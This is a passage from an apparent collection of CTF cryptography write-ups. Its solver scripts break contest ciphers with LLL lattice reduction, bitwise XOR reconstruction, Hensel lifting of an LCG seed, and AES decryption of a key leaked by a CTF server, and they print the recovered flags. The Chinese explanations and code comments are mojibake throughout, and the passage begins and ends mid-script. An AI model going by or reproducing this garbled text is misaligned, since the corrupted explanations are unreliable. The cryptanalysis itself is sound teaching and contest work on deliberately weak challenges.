S_vec = (46147, 52452, 46661, 41313, 45329, 56710, 22716, 60048, 7531, 57956, 43635, 6865, 27649, 15280, 20963, 31871, 12088, 65368, 29612, 39641, 53837, 58597, 30620, 53443, 27963, 17687, 5191, 53831, 13115, 56927, 42723, 16589, 55206, 57677, 34314, 22949, 51886, 19471, 27427, 28514, 54538, 60595, 42958, 25021, 10867, 57037, 35767, 50850, 6847, 2927, 63781, 41308, 62381, 17164, 4673, 57568, 28371, 64296, 46780, 23692, 55183, 62120, 14601, 13632)
A_vec = (6672, 6350, 54616, 61915, 41606, 22475, 60337, 33513, 3313, 28909, 41958, 5962, 51820, 44248, 4065, 12634, 22740, 28634, 23512, 8821, 31862, 17372, 16090, 22034, 51226, 46284, 34399, 54981, 13952, 28952, 37330, 28217, 61185, 30089, 29461, 61627, 8862, 13953, 35361, 56259, 17576, 59751, 50416, 47356, 53008, 5502, 54239, 17120, 21370, 60413, 40762, 58038, 26013, 7577, 6174, 5516, 55742, 62684, 62690, 2616, 35700, 44473, 52409, 61782)
b_val = 31406

S1 = 49766128037688049554820940481512577374877082945061945368559257533763955716155048283594399996468577400153392858063758413824972309722341994134
S2 = 4403170647973657501812455423273579822085376510479535553996144698715186008446711898351057843985856064697053372523016176361594033620425527470135140395950572
S3 = 2280092490476650374559153036238968049212853871863099272082918173685177052127193137159631919327222697692351286157560120442811622767226016453440426345266868
S5_minus_m1 = 5953779515854306592437835145938391720619647350968976605123040510652967823934069354023960385825831707873106351516503464884756255789240813902048947132420142

p = 16227904979008897136248418192031314748505412380277026321741173198464052888603594501056875516599241959885632352910047386720881612381490986295441173263046508863568678875891863304142827241049053409505414701240071874394990874450228904184585460083532035618474206073202588430218751517767661890167793031564919805264830719544775969326937520389510119490226442672938411870362857201786663173905162389234501443225523670805044080971459
h = 7670249262620704753980815476762507729255066238739781136319625742011262177074795984359799744392590600821454300433620556061365270504441363584048417463022679854301647971713942799254621753907064538670727603259663836429995917326353557828885909543624262061400848266618171689398430292246770705845547238619257582056269515560485718447260793746703101618652712066827389461869550695598155696485234878222994565797487914488139538499340
c = 14429329882843202868007310856396559151286321017615769851023773970350550719937052360829994523971443476285582649472661288049559607031520496393719371721379721417612456366837213070725163130404745789492596362764953071192149548740423594536555742221304616367566933490759482789035561897713682847315817058003655924194630397363128653943091399075093769255229738173641889490913137440248912293179277610445400690535860920129097112605206
# -------------------------------------------------------------------

# ----------------- ç¬¬ 1 æ­¥ï¼šç”± encrypt3 æ±‚ m1 -----------------
q = 65537
dot = sum((a*s) % q for a, s in zip(A_vec, S_vec)) % q
r = (b_val - dot) % q  # r = error*257 + m1 (mod q), error in [-127,127]

m1 = None
for error in range(-127, 128):
    cand = (r - error*257) % q
    if 0 <= cand <= 100:  # å¸Œæœ› m1 å¾ˆå°ï¼ˆä»é¢˜é¢æ‰“å° S5=s[5]-m1 çœ‹å‡ºï¼‰
        m1 = cand
        break
assert m1 is not None
# ç»è®¡ç®—å¾—åˆ° m1 = 71

# ----------------- ç¬¬ 2 æ­¥ï¼šLLL åµŒå…¥æ¢å¤ s4=msg -----------------
# ç›®æ ‡ï¼šæ‰¾åˆ° |t*p - s*h - c| = msg <= 2^512
# ç”¨åµŒå…¥åŸºï¼š (p,0,0), (h,1,0), (-c,0,B)ï¼›æ‰¾ç¬¬ä¸‰ç³»æ•°ä¸º Â±1 çš„æœ€çŸ­å‘é‡
B_scale = 1 << 512

def gram_schmidt(B):
    n, m = len(B), len(B[0])
    Bstar = [[Fraction(0) for _ in range(m)] for _ in range(n)]
    mu = [[Fraction(0) for _ in range(n)] for _ in range(n)]
    Bnorm = [Fraction(0) for _ in range(n)]
    for i in range(n):
        v = [Fraction(x) for x in B[i]]
        for j in range(i):
            mu[i][j] = sum(Fraction(B[i][k])*Bstar[j][k] for k in range(m)) / Bnorm[j]
            for k in range(m):
                v[k] -= mu[i][j]*Bstar[j][k]
        Bstar[i] = v
        Bnorm[i] = sum(x*x for x in v)
    return Bstar, mu, Bnorm

def lll_reduce_with_U(B, delta=Fraction(3,4)):
    B = [row[:] for row in B]
    n, m = len(B), len(B[0])
    U = [[int(i==j) for j in range(n)] for i in range(n)]
    def size_reduce(k, j, r):
        if r == 0: return
        for i in range(m):
            B[k][i] -= r*B[j][i]
        for i in range(n):
            U[k][i] -= r*U[j][i]
    Bstar, mu, Bnorm = gram_schmidt(B)
    k = 1
    while k < n:
        for j in range(k-1, -1, -1):
            r = int(mu[k][j].limit_denominator().__round__())
            size_reduce(k, j, r)
        Bstar, mu, Bnorm = gram_schmidt(B)
        if Bnorm[k] >= (delta - mu[k][k-1]**2)*Bnorm[k-1]:
            k += 1
        else:
            B[k], B[k-1] = B[k-1], B[k]
            U[k], U[k-1] = U[k-1], U[k]
            Bstar, mu, Bnorm = gram_schmidt(B)
            k = max(1, k-1)
    return B, U

basis = [
    [p, 0, 0],
    [h, 1, 0],
    [-c, 0, B_scale],
]
Bred, U = lll_reduce_with_U(basis)

s4 = None
for row, coeff in zip(Bred, U):
    gamma = coeff[2]
    if abs(gamma) == 1:
        # row = coeff[0]*(p,0,0) + coeff[1]*(h,1,0) + gamma*(-c,0,B)
        # row[0] = t*p + s*h - c  (t=coeff[0], s=coeff[1])
        msg_candidate = abs(row[0])
        # éªŒè¯ï¼šs*h + msg â‰¡ c (mod p)
        if (coeff[1]*h + msg_candidate - c) % p == 0:
            s4 = msg_candidate
            break
assert s4 is not None  # æˆåŠŸæ¢å¤ s4

# ----------------- ç¬¬ 3 æ­¥ï¼šç”± s1..s4..s5 æ±‚ n,a,b,m -----------------
s1, s2, s3 = S1, S2, S3
s5 = S5_minus_m1 + m1

t1 = s2 - s1
t2 = s3 - s2
t3 = s4 - s3
t4 = s5 - s4

G1 = t3*t1 - t2*t2
G2 = t4*t2 - t3*t3
n = abs(gcd(G1, G2))          # 512-bit prime

a = ((s3 - s2) * pow((s2 - s1) % n, -1, n)) % n
b = (s2 - a*s1) % n
m = ( (s1 - b) * pow(a, -1, n) ) % n

# è¾“å‡º flag
def long_to_bytes(x):
    # å»æ‰å‰å¯¼ 0 çš„å®‰å…¨è½¬æ¢
    blen = (x.bit_length() + 7)//8
    return x.to_bytes(blen, 'big')

print("m1 =", m1)
print("s4 =", s4)
print("n bits =", n.bit_length())
print("flag =", long_to_bytes(m))
```

è¾“å‡ºç»“æœ

```
m1 = 71
s4 = 4278723064555061005124434719241777517796124789012632755078043007588994165877888379078171538271409386619086809297722468399025425525807804031559991900564269
n bits = 512
flag = b'SYC{when_meet_LLL_W1th_Lc0}'
```

# The Two Witnesses

å¤ªé…·äº†ï¼Œè¿™é¢˜åä¸º â€œThe Two Witnessesâ€ï¼Œæ ¸å¿ƒæ˜¯æŠŠç»™å‡ºçš„ `(n_i, M_i)` æ‹†å›é‚£ä¸ªè¢«â€œä¸¤ä¸ªè¯äººâ€æ©ç›–è¿‡çš„å¯†æ–‡ `C = msg^e mod P`ï¼Œå†å¯¹ `C` åšä¸€æ¬¡å¸¸è§„çš„æ¨¡é€†å¹‚æ‹¿åˆ° `msg`ï¼Œæœ€åæŒ‰é¢˜æ„è¾“å‡º `SYC{sha256(str(msg))}`ã€‚ä¸‹é¢æ˜¯æ€è·¯ + æˆ‘ç›´æ¥è·‘å‡ºçš„æœ€ç»ˆç­”æ¡ˆã€‚

# 

é¢˜é¢é‡Œæ¯æ¡æ ·æœ¬æ˜¯è¿™ä¹ˆæ¥çš„ï¼š

- éšæœºå– `K âˆˆ [0, n)`
- è®° `c1 = K`
- è®° `c2 = (C ^ K) % n`ï¼ˆè¿™é‡Œ `^` æ˜¯æŒ‰ä½ XORï¼‰
- å…¬å¼€ `M = (c1 + c2) % n = (K + (C ^ K)) % n`

å…³é”®æ’ç­‰å¼ï¼ˆä½è¿ç®—åˆ†è§£ï¼‰ï¼š

```
K + (C ^ K) = C + 2 * (K & ~C)
```

å› æ­¤

```
M â‰¡ C + 2T (mod n)ï¼Œå…¶ä¸­ T := (K & ~C)
```

æŠŠâ€œæ˜¯å¦å–æ¨¡å›ç»•ä¸€æ¬¡â€çš„äºŒä¹‰æ€§æŠ½è±¡æˆ `w âˆˆ {0,1}`ï¼Œå¯å†™æˆ

```
(M - C) + wÂ·n = 2T
â‡’  T = ((M + wÂ·n) - C) / 2
ä¸”å¿…é¡»æ»¡è¶³   T & C = 0
```

è¿™å°±æ˜¯â€œä¸¤ä½è¯äººä½†åªæœ‰ä¸€ä¸ªè¯´çœŸè¯â€çš„å«ä¹‰ï¼šæ¯æ¡æ ·æœ¬çš„ `w` åœ¨ {0,1} é‡ŒäºŒé€‰ä¸€ï¼Œä½†é€‰å®šåå¿…é¡»èƒ½åŒæ—¶è®©ä¸Šå¼å¯æ•´é™¤ä¸” `T & C = 0`ã€‚

æ¥ä¸‹æ¥å°±èƒ½â€œé€ä½æ„é€ â€`C`ï¼š

- å…ˆæšä¸¾ `C` çš„æœ€ä½ä½ `câ‚€âˆˆ{0,1}`ï¼Œè¿™ä¼šå¼ºåˆ¶æ¯æ¡æ ·æœ¬çš„ `w_i â‰¡ câ‚€ - (M_i mod 2) (mod 2)`ï¼Œä»¤ `D_i := M_i + w_iÂ·n_i`ï¼Œæ­¤æ—¶ `D_i` ä¸ `C` åŒå¥‡å¶ã€‚
- å¯¹ `b = 0..bitlen(P)-1` é€ä½å†³å®š `c_b`ã€‚åšå‡æ³• `D_i - C` æ—¶çš„â€œå€Ÿä½â€åªä¾èµ–å·²ç»ç¡®å®šçš„ä½ä½ï¼›è‹¥æˆ‘ä»¬è¯•å›¾æŠŠ `c_b` è®¾ä¸º 1ï¼Œé‚£ä¹ˆå› ä¸º `T_i = (D_i - C) >> 1`ï¼Œå°±è¦æ±‚ **æ‰€æœ‰æ ·æœ¬** çš„ `T_i` åœ¨ç¬¬ `b` ä½ä¸º 0ã€‚ç­‰ä»·äºå¯¹ **æ‰€æœ‰ i**ï¼Œç¬¬ `b+1` ä½æ»¡è¶³
  `d_{i,b+1} - borrow_{i,b+1} - c_{b+1} â‰¡ 0 (mod 2)`ï¼Œ
  è¿™ä¼š**å¼ºåˆ¶**å‡ºä¸€ä¸ªå…¨ä½“ä¸€è‡´çš„ `c_{b+1}`ï¼›è‹¥è¯¥å¼ºåˆ¶åœ¨ä¸åŒæ ·æœ¬é—´äº’ç›¸çŸ›ç›¾ï¼Œåˆ™æ­¤ä½ä¸å¾—ä¸º 1ï¼Œåªèƒ½å– 0ã€‚
- å¦‚æ­¤çº¿æ€§æ‰«æå³å¯å”¯ä¸€è¿˜åŸ `C`ã€‚

åœ¨è¿˜åŸå‡º `C` åï¼Œç”¨ `d â‰¡ e^{-1} (mod P-1)` è®¡ç®—

```
msg â‰¡ C^d (mod P)   ï¼ˆP ä¸ºç´ æ•°ï¼‰
```

æœ€å `flag = "SYC{" + sha256(str(msg)) + "}"`ã€‚

- å¤åŸå‡ºçš„ `C`ï¼šä¸€ä¸ª 999-bit çš„æ•°ï¼ˆç•¥ï¼‰
- è®¡ç®—å¾—åˆ°çš„ `msg`ï¼š

```
1578498700233432594992895154336351186465836601364364840777478223787042265272540135141124756349
```

- æœ€ç»ˆ flagï¼š

```
SYC{831ae1404f177e612b36a2cd204c9308902fdd4861766d6f277f8558b62ccf94}
```

è„šæœ¬

```
# solve.py - "The Two Witnesses" Crypto CTF solver
# Usage: python3 solve.py data.txt
import sys, hashlib

def egcd(a,b):
    if b == 0:
        return (1,0,a)
    x,y,g = egcd(b, a % b)
    return (y, x - (a//b)*y, g)

def modinv(a, m):
    x, y, g = egcd(a, m)
    if g != 1:
        raise ValueError("no inverse")
    return x % m

def parse(path):
    with open(path, "r") as f:
        ls = [x.strip() for x in f if x.strip()]
    P = int(ls[0].split("=")[1])
    e = int(ls[1].split("=")[1])
    pairs = []
    for line in ls[2:]:
        if "=" in line:
            continue
        if "," in line:
            a, b = line.split(",")
            pairs.append((int(a), int(b)))
    return P, e, pairs

def recover(P, pairs):
    bitlen = P.bit_length()
    def recover_C_for_c0(c0):
        D = []
        for n, M in pairs:
            wi = (c0 - (M & 1)) & 1
            D.append(M + wi * n)
        Dbits = [[(Di >> b) & 1 for b in range(bitlen + 2)] for Di in D]
        borrows = [0] * len(D)
        Cbits = [0] * (bitlen + 2)
        b = 0
        forced_next = None
        def try_bit(cb, need_next=False):
            next_bor = []
            for k in range(len(D)):
                d = Dbits[k][b]
                bi = borrows[k]
                next_bor.append(1 if (d - cb - bi) < 0 else 0)
            if cb == 1:
                vals = set()
                for k in range(len(D)):
                    need = (Dbits[k][b+1] - next_bor[k]) & 1
                    vals.add(need)
                    if len(vals) > 1:
                        return (False, None) if need_next else False
                nxt = vals.pop()
                return (True, nxt) if need_next else True
            else:
                return (True, None) if need_next else True
        while b < bitlen:
            ok1, nx1 = try_bit(1, True)
            if ok1:
                Cbits[b] = 1
                forced_next = nx1
            else:
                ok0, _ = try_bit(0, True)
                if not ok0:
                    return None
                Cbits[b] = 0
                forced_next = None
            new_bor = []
            for k in range(len(D)):
                d = Dbits[k][b]
                bi = borrows[k]
                new_bor.append(1 if (d - Cbits[b] - bi) < 0 else 0)
            borrows = new_bor
            if forced_next is not None:
                Cbits[b+1] = forced_next
            b += 1
        C = 0
        for i in range(bitlen):
            if Cbits[i]:
                C |= (1 << i)
        return C
    def candidate_ok(C):
        for n, M in pairs:
            S = (M - C) % n
            ok_i = ((S % 2 == 0) and (((S >> 1) & C) == 0)) or \
                   (((S + n) % 2 == 0) and ((((S + n) >> 1) & C) == 0))
            if not ok_i:
                return False
        return True
    candidates = []
    for c0 in (0, 1):
        cand = recover_C_for_c0(c0)
        if cand is not None:
            candidates.append(cand)
    good = [c for c in candidates if candidate_ok(c)]
    if not good:
        good = candidates[:]
    if not good:
        raise RuntimeError("Failed to reconstruct C")
    good.sort(key=lambda x: (x % P == 0, x))
    return good[0]

def main():
    path = sys.argv[1] if len(sys.argv) > 1 else "data.txt"
    P, e, pairs = parse(path)
    C = recover(P, pairs)
    d = modinv(e, P-1)  # IMPORTANT
    msg = pow(C, d, P)
    flag = "SYC{" + hashlib.sha256(str(msg).encode()).hexdigest() + "}"
    print(flag)

if __name__ == "__main__":
    main()

```



# Hensel

è¿™æ˜¯å®Œæ•´çš„è§£é¢˜è„šæœ¬ã€‚



### è„šæœ¬è¯´æ˜



1. **Hensel Lifting (äº¨æ³½å°”æå‡):** è„šæœ¬çš„æ ¸å¿ƒåœ¨äº `solve_quartic_mod_2_pow` å‡½æ•°ã€‚å®ƒåˆ©ç”¨æ¨¡ $2^k$ çš„æ€§è´¨ï¼Œä»æ¨¡ 16 å¼€å§‹é€ä½æå‡ï¼Œè§£å‡º $x^4 \equiv \text{Target} \pmod{2^{256}}$ï¼Œä»è€Œæ¢å¤ LCG çš„ç§å­ã€‚
2. **çˆ†ç ´åç§»é‡:** ç”±äºä¸çŸ¥é“ç”Ÿæˆç´ æ•°æ—¶å¤±è´¥äº†å¤šå°‘æ¬¡ï¼Œè„šæœ¬ä¼šä»å°åˆ°å¤§éå†å¯èƒ½çš„â€œæ€»ç”Ÿæˆæ¬¡æ•°â€ (Total Blocks)ï¼Œè®¡ç®—å¯¹åº”çš„ç›®æ ‡å€¼å¹¶å°è¯•æ±‚è§£ç§å­ã€‚
3. **éªŒè¯ä¸è§£å¯†:** ä¸€æ—¦æ‰¾åˆ°å€™é€‰ç§å­ï¼Œè„šæœ¬ä¼šæ¨¡æ‹Ÿé¢˜ç›®ä¸­çš„ç”Ÿæˆè¿‡ç¨‹ã€‚å¦‚æœç”Ÿæˆçš„ $n$ ä¸é¢˜ç›®ç»™å‡ºçš„ $n$ ä¸€è‡´ï¼Œè¯´æ˜æ‰¾åˆ°äº†æ­£ç¡®çš„ç§å­ï¼Œéšå³è®¡ç®—ç§é’¥å¹¶è§£å¯† Flagã€‚



### å®Œæ•´ Python è„šæœ¬



ä½ å¯ä»¥ç›´æ¥è¿è¡Œæ­¤è„šæœ¬ï¼ˆéœ€å®‰è£… `gmpy2` å’Œ `pycryptodome`ï¼‰ï¼š

Python

```
import gmpy2
from Crypto.Util.number import long_to_bytes, isPrime
import sys

# ================= é¢˜ç›®æ•°æ® (æ¥è‡ª output.txt) =================
n = 428640449803984194871411944074280257765303484470405351315048584913337247828960164950258688810827654570926473241145252357999738822200455182132425063640702163050464066320506456228749727865042504528895998106055514976115639826619613470826946264163857897459310046372327108144757186101272839579619856919118864674793134991612566962012229581894898811696057448033352618067878505768336117637676659266971089119664542446471276848706072636876897950579499248116069967663005043474705512242859072983688529666205829563738981813994802335549199073233943340251287514985094145563104189922998994654341671324388921047018181387106596634887149785908217821049480581177400868651709162878243773834309961166489485580841801365072670689377913998503883395399660197385759023947734096405979677444830503545508130961175103433189171988490294916803736906631822422326807484934144165246635771591146925643230998917338718351770907123373757307276202425575323883670173173230901071328008732325498269774830499631598419480292247026554626038249349372135584928508049635291752789541910417821042857687041430123615414020094710899535023153964228750680691334567378700279102721495392042340139295670233647666892528209041967210313691682607952639377152334908813304194340722797463302705693281
a = 76353560870338324521335551434562600156280653606279121933456793214082589662219
c = 271235066678124067469083866180573107379714094931937513898671963041774595512027133737520818397704152518995773796850656091486489992560481970649348984664645520840179114689939331278609379918543728948719023414357220221606700418977645994993581961408258041216276785049347013585582777063346927236861509998577985886935961368919544497422943099050618757466013664849640600483777178806617613753644785304119376939465964812240990854413538186355313522505650792609877376271160522298108301069977221741521075219694469523358130647194035436616444955295472794926397065743686997290409012355654245891679352494222582231714583026908388850074240907239299832945000512650476908828754037267623381485494254966158812397584979705729805358211341050232456377109636742221210343707341109705862873332707102515017582283076222443765565267545860512409458994742171603351579829374737683733843706548425973129483834496832519880619280081942040880427808506641219664729515654760026740976153533926070864410876510774488040599181640298242121910428282251103421082598452589196640298509278859093311805107776957227383814734241540713918698777296798853406621719564694821408048620774888530726331077867568643609473220686831391056055197428876970964344854645937854730121099251193677446011661354
e = 65537

# ================= LCG ä¸æ¨¡æ‹Ÿç±» =================

class Function:
    def __init__(self, seed, a, m):
        self.seed = seed
        self.a = a
        self.m = m

    def generate(self):
        self.seed = (self.a * self.seed) % self.m
        return self.seed

def get_prime_sim(func):
    """
    æ¨¡æ‹Ÿ task.py ä¸­çš„ç´ æ•°ç”Ÿæˆé€»è¾‘
    å¦‚æœç”Ÿæˆçš„ä¸æ»¡è¶³æ¡ä»¶ï¼Œä¼šç»§ç»­ generateï¼Œç›´åˆ°æ‰¾åˆ°ç´ æ•°
    """
    while True:
        p = 0
        for i in range(4):
            p <<= 256
            p |= func.generate()
        
        if p.bit_length() != 1024:
            continue
        if not isPrime(p):
            continue
        return p

# ================= æ ¸å¿ƒè§£é¢˜é€»è¾‘ =================

def solve_quartic_mod_2_pow(target, power):
    """
    ä½¿ç”¨ Hensel Lifting æ±‚è§£ x^4 = target (mod 2^power)
    """
    # æ¨¡ 16 éªŒè¯ï¼šx^4 mod 16 åªèƒ½æ˜¯ 0 æˆ– 1ã€‚ç”±äº seed æ˜¯ç´ æ•°ï¼Œå¿…ä¸ºå¥‡æ•°ï¼Œæ•… target%16 å¿…é¡»æ˜¯ 1
    if target % 16 != 1:
        return []

    # åŸºç¡€è§£ (mod 16 çš„å¥‡æ•°è§£)
    roots = [1, 3, 5, 7, 9, 11, 13, 15]

    # é€ä½æå‡
    # ä» k=4 æå‡åˆ° k=5, ..., ç›´åˆ° power
    for k in range(4, power):
        next_roots = []
        current_mod = 1 << k        # 2^k
        next_mod = 1 << (k + 1)     # 2^(k+1)
        
        target_mod_next = target % next_mod
        
        for r in roots:
            # å¯¹äºæ¯ä¸ª r (å®ƒæ˜¯ mod 2^k çš„è§£), å®ƒæ˜¯ x = r + j * 2^k çš„å½¢å¼
            # åœ¨ mod 2^(k+1) ä¸‹ï¼Œåªæœ‰ä¸¤ç§å¯èƒ½ï¼šr æˆ– r + 2^k
            
            # æ£€æŸ¥ r
            if pow(r, 4, next_mod) == target_mod_next:
                next_roots.append(r)
            
            # æ£€æŸ¥ r + 2^k
            r2 = r | current_mod
            if pow(r2, 4, next_mod) == target_mod_next:
                next_roots.append(r2)
        
        roots = next_roots
        if not roots:
            return []
            
    return roots

def main():
    print("[*] Initializing...")
    m = 2**256
    # è®¡ç®— a çš„é€†å…ƒ
    a_inv = gmpy2.invert(a, m)
    # æ¯ä¸ª block å¯¹åº”ä¸€æ¬¡ generateï¼Œå³ä¹˜ä¸€æ¬¡ a
    # 4ä¸ª block ç»„æˆä¸€ä¸ªæ•°ã€‚
    # æ¯æ¬¡å°è¯•ç”Ÿæˆä¸€ä¸ªç´ æ•°ï¼Œè‡³å°‘æ¶ˆè€—4ä¸ªblockã€‚
    # æ–¹ç¨‹ï¼šn = s^4 * a^(total_blocks * 4) mod m
    # å˜æ¢ï¼šs^4 = n * a^(-4 * total_blocks) mod m
    # æˆ‘ä»¬ä»¤ step_inv = a^(-4)
    
    step_inv = pow(a_inv, 4, m)
    
    # åˆå§‹çŠ¶æ€ï¼šå‡è®¾ total_blocks = 0 (è™½ç„¶ä¸å¯èƒ½ï¼Œä½œä¸ºåŸºå‡†)
    # current_rhs = n mod m
    current_rhs = n % m
    
    # å¼€å§‹çˆ†ç ´ total_blocks
    # total_blocks æŒ‡çš„æ˜¯ç”Ÿæˆ 4 ä¸ªç´ æ•°æ‰€æ¶ˆè€—çš„ generate è°ƒç”¨æ€»æ¬¡æ•° / 4 ?
    # ä¸ï¼Œæ˜¯ generate è°ƒç”¨çš„æ€»æ¬¡æ•°ã€‚ä½†æ³¨æ„ï¼Œget_prime æ˜¯ä¸€æ¬¡å– 4 ä¸ªã€‚
    # æˆ‘ä»¬åœ¨å¾ªç¯é‡Œæ¯æ¬¡ä¹˜ step_invï¼Œå®é™…ä¸Šæ˜¯è®© total_blocks å¢åŠ  1 (å³ generate è°ƒç”¨å¢åŠ  4 æ¬¡)
    # å› æ­¤è¿™é‡Œçš„ iterator 'i' ä»£è¡¨ "è°ƒç”¨ get_prime å°è¯•çš„æ¬¡æ•°" (åŒ…æ‹¬å¤±è´¥çš„)
    
    print("[*] Brute-forcing total LCG steps (using Hensel Lifting)...")
    
    # è‡³å°‘éœ€è¦æˆåŠŸ 4 æ¬¡ï¼Œæ‰€ä»¥ä» 4 å¼€å§‹å°è¯•
    limit = 50000
    
    for i in range(limit):
        # æ¯æ¬¡å¾ªç¯ï¼Œtotal_blocks += 1 (å³å¤šäº†ä¸€ç»„4æ¬¡generate)
        # ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å°è¯•å‡è®¾ï¼šæ€»å…±æ¶ˆè€—äº† i ç»„éšæœºæ•°
        
        # current_rhs = n * (a^-4)^i
        # æ£€æŸ¥æ˜¯å¦æœ‰è§£
        
        if i >= 4: # è‡³å°‘éœ€è¦4ç»„æ‰èƒ½ç”Ÿæˆ4ä¸ªç´ æ•°
            roots = solve_quartic_mod_2_pow(current_rhs, 256)
            
            if roots:
                # æ‰¾åˆ°å€™é€‰ç§å­
                for seed_cand in roots:
                    # é¢˜ç›®ä¸­ seed = getPrime(256)ï¼Œå¿…é¡»æ˜¯ç´ æ•°
                    if not isPrime(seed_cand):
                        continue
                    
                    # æ¨¡æ‹ŸéªŒè¯
                    # print(f"[?] Trying candidate seed (blocks={i}): {seed_cand}")
                    try:
                        func = Function(seed_cand, a, m)
                        p_list = []
                        # å°è¯•ç”Ÿæˆ 4 ä¸ªç´ æ•°
                        for _ in range(4):
                            p_list.append(get_prime_sim(func))
                        
                        # æ£€æŸ¥ä¹˜ç§¯
                        n_calc = 1
                        for p in p_list: n_calc *= p
                        
                        if n_calc == n:
                            print(f"\n[+] Seed Found: {seed_cand}")
                            print(f"[+] Total blocks consumed: {i}")
                            
                            # è§£å¯†
                            phi = 1
                            for p in p_list:
                                phi *= (p - 1)
                            
                            d = gmpy2.invert(e, phi)
                            m_plain = pow(c, d, n)
                            flag = long_to_bytes(m_plain)
                            
                            print("\n" + "="*50)
                            print(f"FLAG: {flag}")
                            try:
                                print(f"Decoded: {flag.decode()}")
                            except:
                                pass
                            print("="*50)
                            return
                    except Exception:
                        pass
        
        # æ›´æ–° RHS ä¸ºä¸‹ä¸€æ¬¡è¿­ä»£
        current_rhs = (current_rhs * step_inv) % m
        
        if i % 2000 == 0:
            print(f"    Checked {i} blocks...")

    print("[-] Failed to find seed within limit.")

if __name__ == "__main__":
    main()
```

ç»“æœ

```
[*] Initializing...
[*] Brute-forcing total LCG steps (using Hensel Lifting)...
    Checked 0 blocks...
    Checked 2000 blocks...

[+] Seed Found: 60055116557987751288202977264332325202547298663689684552100581240461328830819
[+] Total blocks consumed: 2787

==================================================
FLAG: b'SYC{ras3_t0_h1gh3r_power5}'
Decoded: SYC{ras3_t0_h1gh3r_power5}
==================================================
```

# S box

è¿™æ˜¯ä¸€ä»½é’ˆå¯¹ä½ æä¾›çš„ç¯å¢ƒ `geek.ctfplus.cn:31758` çš„å®Œæ•´è§£é¢˜è„šæœ¬ã€‚



### æ¼æ´å›é¡¾



æ­£å¦‚ä¹‹å‰åˆ†æçš„ï¼Œé¢˜ç›®è™½ç„¶å†™äº†ä¸€å †å¤æ‚çš„ SPN ç»“æ„åŠ å¯†ï¼Œä½†å®é™…ä¸Šåœ¨ `handle` å‡½æ•°å¼€å¤´ç›´æ¥æŠŠ AES åŠ å¯†çš„**å¯†é’¥ (key1)**ã€**å¯†æ–‡ (Cipher)** å’Œ **åˆå§‹å‘é‡ (IV)** éƒ½æ‰“å°å‡ºæ¥äº†ã€‚æˆ‘ä»¬åªéœ€è¦è¿æ¥ä¸Šå»ï¼Œæ¥æ”¶è¿™äº›å‚æ•°ï¼Œç„¶åç”¨æ ‡å‡† AES-CBC è§£å¯†å³å¯ã€‚



### è§£é¢˜è„šæœ¬ (Python 3)



è¯·ç¡®ä¿å®‰è£…äº† `pwntools` å’Œ `pycryptodome`ï¼š

Bash

```
pip install pwntools pycryptodome
```

Python

```
#!/usr/bin/env python3
from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Util.number import long_to_bytes
import ast

# ç›®æ ‡ç¯å¢ƒä¿¡æ¯
HOST = 'tcpgeek.ctfplus.cn'
PORT = 31758

def solve():
    # è®¾ç½® pwntools æ—¥å¿—çº§åˆ«ï¼Œæ–¹ä¾¿çœ‹æ”¶å‘æ•°æ®
    context.log_level = 'info'
    
    try:
        # 1. è¿æ¥é¢˜ç›®ç¯å¢ƒ
        io = remote(HOST, PORT)

        # 2. æ¥æ”¶ Key1
        # æœåŠ¡å™¨ç›´æ¥å‘é€äº† key1 çš„åè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚: b'123456789...\n'
        line1 = io.recvline().strip().decode()
        if not line1.isdigit():
            log.error(f"Unexpected data for key: {line1}")
            return
        
        key1_int = int(line1)
        log.success(f"Got Key1 (int): {key1_int}")

        # 3. æ¥æ”¶ Cipher
        # æ ¼å¼: Cipher=b'\x...'
        # æˆ‘ä»¬éœ€è¦æŠŠ "b'\x...'" è¿™ä¸ªå­—ç¬¦ä¸²å½¢å¼è½¬å›çœŸæ­£çš„ bytes å¯¹è±¡
        line2 = io.recvline().strip().decode()
        if 'Cipher=' not in line2:
            log.error(f"Unexpected data for Cipher: {line2}")
            return
        
        cipher_str_repr = line2.split('=', 1)[1] # æå–ç­‰å·åé¢çš„éƒ¨åˆ†
        ciphertext = ast.literal_eval(cipher_str_repr) # å®‰å…¨è§£æ
        log.success(f"Got Ciphertext: {len(ciphertext)} bytes")

        # 4. æ¥æ”¶ IV
        # æ ¼å¼: IV=b'\x...'
        line3 = io.recvline().strip().decode()
        if 'IV=' not in line3:
            log.error(f"Unexpected data for IV: {line3}")
            return

        iv_str_repr = line3.split('=', 1)[1]
        iv = ast.literal_eval(iv_str_repr)
        log.success(f"Got IV: {len(iv)} bytes")

        # 5. è½¬æ¢å¯†é’¥æ ¼å¼
        # æœåŠ¡å™¨ç”¨çš„æ˜¯ long_to_bytes(key1)ï¼ŒAES-128 éœ€è¦ 16 å­—èŠ‚å¯†é’¥
        key_bytes = long_to_bytes(key1_int)
        
        # å¦‚æœç”Ÿæˆçš„éšæœºæ•°é«˜ä½æ˜¯0ï¼Œlong_to_bytes å¯èƒ½ä¼šå°‘äº 16 å­—èŠ‚ï¼Œéœ€è¦è¡¥é½
        if len(key_bytes) < 16:
            key_bytes = key_bytes.rjust(16, b'\0')
        # ç†è®ºä¸Š getrandbits(128) ä¸ä¼šè¶…è¿‡ 16 å­—èŠ‚ï¼Œä½†å¦‚æœè¶…è¿‡æˆªæ–­ï¼ˆé€šå¸¸ä¸ä¼šï¼‰
        elif len(key_bytes) > 16:
            key_bytes = key_bytes[-16:]

        log.info(f"Key bytes (hex): {key_bytes.hex()}")
        log.info(f"IV bytes (hex):  {iv.hex()}")

        # 6. AES è§£å¯†
        cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
        try:
            # è§£å¯†å¹¶å»å¡«å……
            plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
            flag = plaintext.decode()
            
            print("\n" + "="*40)
            print(f"FLAG: {flag}")
            print("="*40 + "\n")
            
        except Exception as e:
            log.error(f"è§£å¯†æˆ–å»å¡«å……å¤±è´¥: {e}")
            # å¦‚æœå»å¡«å……å¤±è´¥ï¼Œå°è¯•ç›´æ¥æ‰“å°è§£å¯†åçš„åŸå§‹å­—èŠ‚çœ‹çœ‹
            log.info(f"Raw decrypted (with padding): {cipher.decrypt(ciphertext)}")

        io.close()

    except Exception as e:
        log.error(f"å‘ç”Ÿé”™è¯¯: {e}")

if __name__ == "__main__":
    solve()
```

# ez lwe

ç¬¬ä¸€æ­¥è„šæœ¬è§£key

```
from Crypto.Util.number import long_to_bytes
from sage.all import *

# ==========================================
